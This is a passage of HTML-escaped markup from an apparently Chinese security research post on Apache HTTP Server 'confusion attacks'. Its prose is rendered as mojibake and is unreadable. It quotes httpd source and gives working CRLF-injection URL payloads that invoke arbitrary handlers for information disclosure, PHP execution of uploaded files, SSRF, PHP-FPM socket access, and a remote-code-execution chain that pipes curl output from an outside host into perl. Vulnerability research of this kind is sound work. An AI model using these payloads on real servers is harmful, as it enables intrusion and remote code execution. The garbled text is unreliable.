        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é¦–å…ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; æœƒå…ˆåŸ·è¡Œ&lt;sup&gt;[1]&lt;/sup&gt; CGI ä¸¦æƒæå…¶è¼¸å‡ºçµæœä¸¦è¨­ç½®ä¸Šç›¸å°æ‡‰çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;ï¼Œå¦‚æœ&lt;sup&gt;[2]&lt;/sup&gt;å›å‚³çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; æ˜¯ 200 ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; æ¨™é ­æ¬„ä½æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; é–‹é ­å‰‡æŠŠé€™å€‹å›æ‡‰ç•¶æˆä¸€å€‹ä¼ºæœå™¨ç«¯çš„è½‰å€ä¸¦é–‹å§‹è™•ç†&lt;sup&gt;[3]&lt;/sup&gt;ã€‚ å†ä»”ç´°å¯©è¦– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; çš„å¯¦ä½œæœƒç™¼ç¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd é¦–å…ˆå‰µå»º&lt;sup&gt;[1]&lt;/sup&gt;äº†ä¸€å€‹æ–°çš„è«‹æ±‚çµæ§‹ä¸¦å°‡ç•¶å‰çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; è¤‡&lt;sup&gt;[2]&lt;/sup&gt;é€²å»ï¼Œåœ¨è™•&lt;sup&gt;[3]&lt;/sup&gt;å®Œç”Ÿå‘½é€±æœŸå¾Œå‘¼å«&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; â€”â€” ä¹Ÿå°±æ˜¯å‰é¢æåŠåŒ…å«æ­·å²éºç•™è½‰æ›çš„åœ°æ–¹ï¼Œæ‰€ä»¥&lt;strong&gt;åœ¨ä¼ºæœå™¨ç«¯è½‰å€ä¸­ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶å›æ‡‰æ¨™é ­ï¼Œå°±å¯ä»¥åœ¨ Httpd ä¸­å‘¼å«ä»»æ„çš„æ¨¡çµ„è™•ç†å™¨ã€‚&lt;/strong&gt; åŸºæœ¬ä¸Šæ‰€æœ‰ Apache HTTP Server ä¸­çš„ CGI ç³»åˆ—å¯¦ä½œéƒ½éµå®ˆé€™å€‹è¡Œç‚ºï¼Œé€™è£¡æ˜¯ä¸€å€‹ç°¡å–®çš„åˆ—è¡¨ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‡³æ–¼å¦‚ä½•åœ¨çœŸå¯¦æƒ…å¢ƒä¸­è§¸ç™¼é€™å€‹ä¼ºæœå™¨è½‰å€å‘¢ï¼Ÿ ç”±æ–¼è‡³å°‘éœ€è¦æ§åˆ¶ HTTP å›æ‡‰ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; åŠéƒ¨åˆ† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;ï¼Œé€™è£¡çµ¦å‡ºå…©å€‹æƒ…å¢ƒä»¥ä¾›åƒè€ƒï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä½æ–¼ CGI å›æ‡‰æ¨™é ­ä¸­çš„ CRLF Injectionï¼Œé€éæ›è¡Œå»è¦†å¯«å·²å­˜åœ¨çš„ HTTP æ¨™é ­&lt;/li&gt;
  &lt;li&gt;å¯å®Œæ•´æ§åˆ¶å›æ‡‰æ¨™é ­çš„ SSRFï¼Œä¾‹å¦‚è¨—ç®¡åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; ä¸Šçš„ &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt; å°ˆæ¡ˆ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æ¥ä¸‹ä¾†çš„ç¯„ä¾‹éƒ½åŸºæ–¼é€™å€‹ä¸å®‰å…¨çš„ CRLF Injection ä¾†åšç¤ºç¯„ï¼š&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;âœ”ï¸ 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;é¦–å…ˆæ˜¯å¾ä»»æ„æ¨¡çµ„è™•ç†å™¨å‘¼å«åˆ°è³‡è¨Šæ´©æ¼ï¼Œé€™è£¡ä½¿ç”¨äº† Httpd å…§å»ºçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; æ¨¡çµ„è™•ç†å™¨ï¼Œé€™å€‹æ¨¡çµ„è™•ç†å™¨é€šå¸¸åªè¢«å…è¨±å¾æœ¬æ©Ÿå­˜å–ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨æ“æœ‰ä»»æ„æ¨¡çµ„è™•ç†å™¨å‘¼å«å¾Œï¼Œå¯ä»¥é€éè¤‡å¯« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; å»å­˜å–åŸæœ¬å­˜å–ä¸åˆ°çš„æ•æ„Ÿè³‡è¨Šï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;âœ”ï¸ 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;ç•¶ç„¶ä¹Ÿèƒ½è¼•é¬†çš„æŠŠä¸€å¼µåœ–ç‰‡è½‰åŒ–æˆ PHP å¾Œé–€ï¼Œä¾‹å¦‚ç•¶ä½¿ç”¨è€…ä¸Šå‚³äº†ä¸€å€‹æ“æœ‰åˆæ³•å‰¯æª”åçš„æª”æ¡ˆå¾Œï¼Œå¯ä»¥é€éé€™å€‹æ”»æ“Šæ‰‹æ³•æŒ‡å®šç‰¹å®šæ¨¡çµ„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; å»åŸ·è¡Œæª”æ¡ˆå…§åµŒçš„æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;ï¸-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;âœ”ï¸ 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; å­˜å–ä»»ä½•å”è­°ä»¥åŠä»»æ„ç¶²å€ç•¶ç„¶ä¹Ÿä¸åœ¨è©±ä¸‹ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¦å¤–é€™ä¹Ÿæ˜¯ä¸€å€‹å¯ä»¥å®Œæ•´æ§åˆ¶ HTTP è«‹æ±‚é‚„æœ‰å–å¾—æ‰€æœ‰ HTTP å›æ‡‰çš„ SSRFï¼ ç¨å¾®å¯æƒœçš„ä¸€é»æ˜¯åœ¨å­˜å– Cloud Metadata æ™‚æœƒè¢« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; æœƒè‡ªå‹•åŠ ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; æ¨™é ­å°è‡´è¢« EC2 åŠ GCP çš„ &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata ä¿è­·æ©Ÿåˆ¶&lt;/a&gt;é˜»æ“‹ï¼Œå¦å‰‡é€™æœƒæ˜¯ä¸€å€‹æ›´å¼·å¤§çš„æ”»æ“Šæ‰‹æ³•ã€‚&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;âœ”ï¸ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;ç„¶è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; æä¾›äº†ä¸€å€‹æ›´ã€Œæ–¹ä¾¿ã€çš„åŠŸèƒ½ â€”â€” å¯ä»¥å­˜å–æœ¬åœ°çš„ Unix Domain Socketï¼ ğŸ˜‰&lt;/p&gt;

&lt;p&gt;é€™è£¡å±•ç¤ºé€éå­˜å– PHP-FPM æœ¬åœ°çš„ Unix Domain Socket å»åŸ·è¡Œä½æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt; ä¸‹çš„ PHP å¾Œé–€ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;é€™å€‹æ‰‹æ³•ç†è«–ä¸Šé‚„å­˜åœ¨è‘—æ›´å¤šçš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å”è­°èµ°ç§ (åœ¨ HTTP/HTTPS å”è­°é–“èµ°ç§ FastCGI ğŸ˜) æˆ–å…¶å®ƒæ˜“å—å½±éŸ¿çš„ Local Sockets ç­‰ï¼Œé€™éƒ½äº¤çµ¦æœ‰èˆˆè¶£çš„äººç¹¼çºŒç ”ç©¶äº†ã€‚&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-2-4-arbitrary-handler-to-rce&quot;&gt;âœ”ï¸ 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;æœ€å¾Œä¾†å±•ç¤ºä¸€ä¸‹å¦‚ä½•é€éä¸€å€‹å¸¸è¦‹çš„ CTF å°æŠ€å·§æŠŠé€™å€‹æ”»æ“Šæ‰‹æ³•è½‰åŒ–æˆ RCEï¼ ç”±æ–¼ PHP å®˜æ–¹çš„ &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;Docker æ˜ åƒæª”&lt;/a&gt; åœ¨å»ºæ§‹æ™‚å¼•å…¥äº† PEAR é€™å¥—å‘½ä»¤åˆ— PHP å¥—ä»¶ç®¡ç†å·¥å…·ï¼Œé€éå…¶ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; ä½œç‚ºå…¥å£é»å¯ä»¥è®“æˆ‘å€‘é”æˆæ›´é€²ä¸€æ­¥çš„åˆ©ç”¨ï¼Œè©³ç´°çš„æ­·å²åŠåŸç†å¯ä»¥åƒè€ƒç”± &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; æ’°å¯«çš„ &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI ç¸½çµæ–‡&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é€™è£¡æˆ‘å€‘åˆ©ç”¨åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; å…§çš„ Command Injection ä¾†å®Œæˆæ•´å€‹æ”»æ“Šéˆï¼Œè©³ç´°çš„æ”»æ“Šéˆå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç¶²è·¯ä¸Šç¶“å¸¸åœ¨ Security Advisory æˆ– Bug Bounty çœ‹åˆ°æŠŠ CRLF Injection æˆ– Header Injection ç•¶æˆ XSS å ±å‘Šï¼Œé›–ç„¶ç¢ºå¯¦æœ‰æ©Ÿæœƒé€é SSO ä¸²å‡º Account Takeover ç­‰ç²¾å½©æ¼æ´ï¼Œä½†è«‹ä¸è¦å¿˜äº†å®ƒä¹Ÿèƒ½ä¸²å‡º Server-Side RCEï¼Œé€™å€‹ç¤ºç¯„è­‰æ˜äº†å®ƒçš„å¯èƒ½ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-4-å…¶å®ƒæ¼æ´&quot;&gt;ğŸ”¥ 4. å…¶å®ƒæ¼æ´&lt;/h3&gt;

&lt;p&gt;åŸºæœ¬ä¸Šæ•´å€‹ Confusion Attacks ç³»åˆ—åˆ°é€™é‚Šå·®ä¸å¤šå‘Šä¸€å€‹æ®µè½ï¼Œç„¶è€Œåœ¨ç ”ç©¶ Apache HTTP Server çš„éç¨‹ä¸­é‚„æœ‰äº›å€¼å¾—ä¸€æçš„æ¼æ´å› æ­¤å°‡å®ƒå€‘ç¨ç«‹å‡ºä¾†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-cve-2024-38472---åŸºæ–¼-windows-unc-çš„-ssrf&quot;&gt;âš”ï¸ CVE-2024-38472 - åŸºæ–¼ Windows UNC çš„ SSRF&lt;/h4&gt;

&lt;p&gt;é¦–å…ˆæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apr_filepath_merge()&lt;/code&gt; å‡½æ•¸åœ¨ Windows çš„å¯¦ä½œå…è¨±ä½¿ç”¨ UNC è·¯å¾‘ï¼Œä¸‹é¢æä¾›å…©ç¨®ä¸åŒçš„è§¸ç™¼è·¯å¾‘è®“æ”»æ“Šè€…å¯ä»¥å‘ä»»æ„ä¸»æ©Ÿç™¼èµ· NTLM èªè­‰ï¼š&lt;/p&gt;

&lt;h5 id=&quot;ï¸-é€é-http-è«‹æ±‚è§£æå™¨è§¸ç™¼&quot;&gt;âœ”ï¸ é€é HTTP è«‹æ±‚è§£æå™¨è§¸ç™¼&lt;/h5&gt;

